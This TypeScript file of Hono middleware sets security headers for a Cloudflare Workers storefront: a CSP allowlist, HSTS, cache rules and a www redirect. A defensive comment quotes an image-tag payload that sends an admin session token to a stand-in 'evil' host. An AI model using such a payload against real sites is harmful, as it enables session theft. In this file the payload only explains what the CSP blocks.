// Reproduces the security headers from the Hostinger .htaccess (lines 39-58) as Hono middleware.
//
// What did NOT need porting, and why:
//   - `Options -Indexes`            → Workers Static Assets does not do directory listing.
//   - `DirectoryIndex index.php`    → the catch-all shell route handles this.
//   - 301 /index.html → /           → kept, since old bookmarks and cached links still exist.
//   - Deny config.php/applog.php/secrets.php/.ftp-credentials/.env/*.log/*.txt → those files are
//     simply not in public/, so there is nothing to deny.
//
// One live-site quirk deliberately NOT carried over: the .htaccess `\.(log|txt)$` deny rule also
// matched robots.txt, so robots.txt was almost certainly returning 403 in production. Here it
// serves normally.

import { createMiddleware } from "hono/factory";
import type { Env } from "../types";

// Real allowlist as of the 2026-08-21 hardening pass — the previous CSP only set
// `upgrade-insecure-requests; frame-ancestors 'self'`, which is clickjacking/HTTPS protection
// only and does nothing against XSS (no script-src at all means an injected `<script src=...>`
// from ANY host would run). Most external hosts below were found by grepping the actual front end
// (public/index.html + js/*.js) for outbound requests; `static.cloudflareinsights.com`/
// `cloudflareinsights.com` were NOT — that's Cloudflare's own Web Analytics beacon, injected at
// the edge into every HTML response for this zone, invisible to a source-code grep. Both were
// caught empirically: an initial CSP built from grep alone blocked it (real browser console error
// against a real staging load), which is exactly why this was verified against a live page, not
// shipped from static analysis alone. Full list verified against a real staging checkout too
// (Square Sandbox card + PayPal Sandbox) — see PROJECT_STATUS.md for how.
//
// 'unsafe-inline' on script-src and style-src is a real, deliberate compromise, not an oversight:
// this codebase is ~9,900 lines of vanilla JS that builds admin/storefront UI via innerHTML
// strings full of onclick="..." handlers and inline style="..." attributes (js/admin-*.js,
// js/store.js throughout) — a strict script-src without it would break nearly every button in the
// admin back office. That means this CSP does NOT stop inline-script injection (the most common
// XSS payload shape); what it DOES still stop, even with 'unsafe-inline' present, is the other
// two links in a real attack chain: connect-src blocks an injected script from exfiltrating the
// admin session token (js/auth.js stores it in sessionStorage) to an attacker-controlled host via
// fetch/XHR, and img-src blocks the classic `<img src="https://evil/steal?token=...">` exfil
// fallback. Both only work because they're a real allowlist, not `*`.
const CSP = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline' https://www.googletagmanager.com https://web.squarecdn.com https://sandbox.web.squarecdn.com https://www.paypal.com https://www.paypalobjects.com https://static.cloudflareinsights.com",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com",
  "img-src 'self' data: https://www.paypalobjects.com https://www.google-analytics.com",
  "connect-src 'self' https://www.google-analytics.com https://analytics.google.com https://www.googletagmanager.com https://connect.squareup.com https://connect.squareupsandbox.com https://pci-connect.squareup.com https://web.squarecdn.com https://sandbox.web.squarecdn.com https://*.paypal.com https://*.paypalobjects.com https://cloudflareinsights.com",
  "frame-src https://web.squarecdn.com https://sandbox.web.squarecdn.com https://*.paypal.com",
  "object-src 'none'",
  "base-uri 'self'",
  "frame-ancestors 'self'",
  "upgrade-insecure-requests",
].join("; ");
const PERMISSIONS_POLICY =
  "camera=(), microphone=(), geolocation=(), usb=(), magnetometer=(), gyroscope=(), payment=(self)";

/** Matches the .htaccess FilesMatch that disabled caching for js/css/php/html. */
const NO_STORE = /\.(js|css|html)$/i;

export const securityHeaders = createMiddleware<{ Bindings: Env }>(async (c, next) => {
  await next();

  // ⚠️ A Response returned from a binding fetch (env.ASSETS.fetch(), and R2 in later phases) has
  // IMMUTABLE headers in the Workers runtime. Calling .set() directly on c.res.headers threw an
  // unhandled TypeError for every real static asset (js/css/images) — every dynamic route built
  // its own Response and was unaffected, so the bug only showed up on real files, not on /api/*
  // or the rendered shell, and workerd's generic "Internal Server Error" body gave no clue why.
  // Caught by requesting an actual asset through a running Worker, not by a unit test — nothing
  // in this file's own logic was wrong, only its assumption about the Response it was mutating.
  // c.res = new Response(...) rebuilds the response with a fresh, mutable Headers object.
  c.res = new Response(c.res.body, c.res);

  const h = c.res.headers;
  h.set("Content-Security-Policy", CSP);
  h.set("X-Frame-Options", "SAMEORIGIN");
  h.set("X-Content-Type-Options", "nosniff");
  h.set("Referrer-Policy", "strict-origin-when-cross-origin");
  h.set("Strict-Transport-Security", "max-age=31536000; includeSubDomains");
  h.set("Permissions-Policy", PERMISSIONS_POLICY);

  const path = new URL(c.req.url).pathname;
  const isDocument = path === "/" || !path.includes(".");
  if (isDocument || NO_STORE.test(path)) {
    h.set("Cache-Control", "no-store, no-cache, must-revalidate");
    h.set("Pragma", "no-cache");
    h.delete("Expires");
  }

  // Staging must never be indexed. On Hostinger this came from staging's own .htaccess, which
  // deploys were forbidden to overwrite (deploy.ps1:33) — a rule that no longer needs to exist.
  if (c.env.ENVIRONMENT === "staging") {
    h.set("X-Robots-Tag", "noindex, nofollow");
  }
});

/**
 * www → apex 301, done at the app layer rather than as a Cloudflare Redirect Rule, mirroring
 * BusinessWebExpress's redirectWwwToApex. Keeping it in the repo means one less piece of
 * behaviour living only in dashboard config.
 */
export const redirectWwwToApex = createMiddleware<{ Bindings: Env }>(async (c, next) => {
  const url = new URL(c.req.url);
  if (url.hostname.startsWith("www.")) {
    url.hostname = url.hostname.slice(4);
    return c.redirect(url.toString(), 301);
  }
  await next();
});
